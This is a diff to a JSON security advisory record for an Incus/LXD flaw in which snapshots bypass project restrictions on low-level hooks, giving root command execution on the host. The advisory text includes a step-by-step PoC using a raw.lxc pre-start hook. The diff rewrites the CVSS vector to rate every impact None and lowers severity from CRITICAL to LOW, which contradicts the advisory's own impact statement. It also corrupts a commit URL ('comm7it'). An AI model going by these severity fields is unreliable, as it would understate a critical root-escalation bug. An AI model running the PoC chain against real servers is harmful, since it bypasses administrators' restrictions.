@@ -8,8 +8,8 @@
   "details": "Reported from https://github.com/lxc/incus/security/advisories/GHSA-48q5-w887-33wv\n\n### Summary\n\nInstance snapshots ignore the `restricted.containers.lowlevel=block` setting;\nallowing for arbitrary command execution on the Incus server by abusing\nlowlevel hooks such as `raw.lxc` and `raw.qemu`.\n\n\n### Details\n\nInstance snapshots ignore the `restricted.containers.lowlevel=block` setting;\nallowing for arbitrary command execution on the Incus server by abusing\nlowlevel hooks such as `raw.lxc` and `raw.qemu`.\n\nAs snapshots can be moved from one server to another, a malicious\ninstance+snapshot can be crafted locally, moved to a restricted project\nand the snapshot restored for arbitrary command execution.\n\nIn practice, this allows a malicious actor to execute arbitrary commands\non the host with root privileges.\n\n\n### PoC\n\n```\n# remote, restricted\nincus project set rem:project restricted.true\nincus project set rem:project restricted.containers.lowlevel=block\n\n# locally, unrestricted project\nincus init images:debian/trixie rce-raw-lxc\nincus config set rce-raw-lxc raw.lxc='lxc.hook.pre-start = /bin/sh -c \"/bin/id >/lxc-hook-prestart\"'\nincus snapshot create rce-raw-lxc snap0\n#> allow transfer to restricted project\nincus config unset rce-raw-lxc raw.lxc\n\n# locally, transfer and trigger\nincus move rce-raw-lxc rem: --mode push\nincus snapshot restore rem:rce-raw-lxc snap0\nincus start rem:rce-raw-lxc\n```\n\n\n### Impact\n\n- Bypass of project restrictions.\n- Arbitrary command execution on the Incus server.",
   "severity": [
     {
-      "type": "CVSS_V3",
-      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:N/SI:N/SA:N"
     }
   ],
   "affected": [
@@ -48,10 +48,6 @@
     },
     {
       "type": "WEB",
-      "url": "https://github.com/canonical/lxd/commit/5aac658c888d52e3a2480a8f879799ac643fdc49"
-    },
-    {
-      "type": "WEB",
       "url": "https://github.com/canonical/lxd/commit/6b93b2a0c4f6f3eaf91e1e813f6875d5eb66b59b"
     },
     {
@@ -68,6 +64,10 @@
     },
     {
       "type": "WEB",
+      "url": "https://github.com/canonical/lxd/comm7it/5aac658c888d52e3a2480a8f879799ac643fdc49"
+    },
+    {
+      "type": "WEB",
       "url": "https://github.com/canonical/lxd/releases/tag/lxd-5.0.7"
     },
     {
@@ -79,7 +79,7 @@
     "cwe_ids": [
       "CWE-862"
     ],
-    "severity": "CRITICAL",
+    "severity": "LOW",
     "github_reviewed": true,
     "github_reviewed_at": "2026-11-06T19:51:26Z",
     "nvd_published_at": null
